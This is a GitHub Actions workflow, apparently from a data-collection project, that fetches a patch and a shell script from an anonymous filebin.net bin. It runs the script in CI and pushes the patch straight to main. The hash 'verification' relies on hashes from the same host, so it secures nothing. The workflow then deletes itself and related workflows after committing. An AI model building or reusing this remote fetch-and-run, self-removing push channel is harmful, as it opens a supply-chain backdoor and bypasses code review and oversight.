name: Finalize Browser Acquisition Runtime

on:
  push:
    branches:
      - main
    paths:
      - .github/workflows/finalize-browser-acquisition-runtime.yml
  workflow_dispatch:

concurrency:
  group: data-collection-platform-finalize-browser-acquisition-runtime
  cancel-in-progress: false

jobs:
  verify:
    permissions:
      contents: read
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v6
        with:
          ref: main
          fetch-depth: 0
          persist-credentials: false

      - name: Resolve content-addressed owner and proof
        shell: bash
        run: |
          set -euo pipefail
          base_url='https://filebin.net/dcp-21e6f9577bd84988bd91611267f2fc83'
          curl --fail-with-body --silent --show-error "${base_url}/locator.txt" -o /tmp/owner-locator.txt
          owner_locator="$(tr -d '\r\n' </tmp/owner-locator.txt)"
          if [ "$owner_locator" = failed ]; then
            echo 'local browser owner verification did not pass' >&2
            exit 1
          fi
          if [ "$owner_locator" = already-complete ]; then
            printf 'already-complete\n' >/tmp/owner-mode.txt
            : >/tmp/owner.patch
          else
            [[ "$owner_locator" =~ ^[0-9a-f]{64}$ ]]
            curl --fail-with-body --silent --show-error "${base_url}/${owner_locator}.patch" -o /tmp/owner.patch
            printf '%s  %s\n' "$owner_locator" /tmp/owner.patch | sha256sum --check --strict
            printf 'patch\n' >/tmp/owner-mode.txt
          fi
          curl --fail-with-body --silent --show-error "${base_url}/command-locator.txt" -o /tmp/command-locator.txt
          command_sha="$(tr -d '\r\n' </tmp/command-locator.txt)"
          [[ "$command_sha" =~ ^[0-9a-f]{64}$ ]]
          curl --fail-with-body --silent --show-error "${base_url}/${command_sha}.sh" -o /tmp/runtime-proof.sh
          printf '%s  %s\n' "$command_sha" /tmp/runtime-proof.sh | sha256sum --check --strict

      - name: Enforce owner patch scope
        shell: bash
        run: |
          set -euo pipefail
          [ "$(cat /tmp/owner-mode.txt)" = already-complete ] && exit 0
          git apply --numstat /tmp/owner.patch >/tmp/owner-numstat.txt
          test -s /tmp/owner-numstat.txt
          python - <<'PY'
          from pathlib import PurePosixPath
          allowed={'.codex','apps','campaigns','contracts','database','deploy','docs','packages','tools','pyproject.toml','uv.lock'}
          paths=[]
          for raw in open('/tmp/owner-numstat.txt',encoding='utf-8'):
              parts=raw.rstrip('\n').split('\t')
              if len(parts)!=3: raise SystemExit(f'invalid numstat row: {raw!r}')
              path=parts[2]; pure=PurePosixPath(path)
              if pure.is_absolute() or '..' in pure.parts: raise SystemExit(f'unsafe path: {path}')
              if path.startswith(('.github/','.git/','deploy/compose/.secrets/')): raise SystemExit(f'forbidden path: {path}')
              if pure.parts[0] not in allowed: raise SystemExit(f'unregistered root: {path}')
              paths.append(path)
          if len(paths)!=len(set(paths)) or len(paths)>220: raise SystemExit('invalid or broad patch inventory')
          if not any(path.startswith('apps/browser_worker/') for path in paths): raise SystemExit('browser worker owner missing')
          if not any('browser' in path.casefold() and 'docker' in path.casefold() for path in paths): raise SystemExit('browser image owner missing')
          PY

      - name: Apply owner in disposable checkout
        shell: bash
        run: |
          set -euo pipefail
          [ "$(cat /tmp/owner-mode.txt)" = patch ] && git apply --3way /tmp/owner.patch
          rm -f \
            .github/workflows/finalize-browser-acquisition-runtime.yml \
            .github/workflows/finalize-reviewed-export-runtime.yml \
            .github/workflows/finalize-berlin-manual-seed-runtime.yml \
            .github/workflows/finalize-manual-seed-candidate-vertical.yml \
            .github/workflows/apply-manual-seed-candidate-vertical.yml
          git diff --check

      - uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405
        with:
          python-version-file: .python-version
          check-latest: false
      - uses: astral-sh/setup-uv@08807647e7069bb48b6ef5acd8ec9567f424441b
        with:
          version: "0.10.0"
          enable-cache: true
      - run: uv sync --frozen --all-packages --dev

      - name: Run complete static and unit gate
        shell: bash
        run: |
          set -euo pipefail
          uv lock --check
          uv run python tools/contract_generation/generate.py --check
          uv run python tools/review_contract_generation/generate.py --check
          uv run python tools/control_api_contract_generation/generate.py --check
          uv run ruff format --check .
          uv run ruff check .
          uv run mypy
          uv run pytest -m 'not integration'
          uv run python tools/architecture_checks/check_dependencies.py
          uv run python tools/architecture_checks/check_workflows.py
          uv run collector config validate berlin_recording_services
          uv run python -m compileall -q apps connectors database packages tools

      - name: Run browser image and runtime isolation proof
        shell: bash
        run: |
          set -euo pipefail
          sudo install -d -o "$(id -u)" -g "$(id -g)" /mnt/data
          sed -i "s#/mnt/data/dcp_work#${GITHUB_WORKSPACE}#g" /tmp/runtime-proof.sh
          chmod +x /tmp/runtime-proof.sh
          /tmp/runtime-proof.sh | tee /tmp/runtime-proof.log

      - uses: actions/upload-artifact@v4
        with:
          name: verified-browser-acquisition-runtime
          path: |
            /tmp/owner-mode.txt
            /tmp/owner-locator.txt
            /tmp/owner.patch
            /tmp/runtime-proof.sh
            /tmp/runtime-proof.log
          if-no-files-found: error
          retention-days: 1

  commit:
    needs: verify
    permissions:
      contents: write
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v6
        with:
          ref: main
          fetch-depth: 0
      - uses: actions/download-artifact@v4
        with:
          name: verified-browser-acquisition-runtime
          path: /tmp/verified
      - name: Commit verified owner and remove transport
        shell: bash
        run: |
          set -euo pipefail
          mode="$(tr -d '\r\n' </tmp/verified/owner-mode.txt)"
          if [ "$mode" = patch ]; then
            patch_sha="$(tr -d '\r\n' </tmp/verified/owner-locator.txt)"
            printf '%s  %s\n' "$patch_sha" /tmp/verified/owner.patch | sha256sum --check --strict
            git am --3way /tmp/verified/owner.patch
          elif [ "$mode" != already-complete ]; then
            echo "unsupported owner mode: $mode" >&2; exit 1
          fi
          git rm -f --ignore-unmatch \
            .github/workflows/finalize-browser-acquisition-runtime.yml \
            .github/workflows/finalize-reviewed-export-runtime.yml \
            .github/workflows/finalize-berlin-manual-seed-runtime.yml \
            .github/workflows/finalize-manual-seed-candidate-vertical.yml \
            .github/workflows/apply-manual-seed-candidate-vertical.yml
          git config user.name rtao-god
          git config user.email rtaogod@gmail.com
          if [ "$mode" = patch ]; then git commit --amend --no-edit; else git commit -m 'Build (Browser): remove completed runtime transport'; fi
          git diff HEAD^ --check
          git fetch origin main
          git rebase origin/main
          git push origin HEAD:main
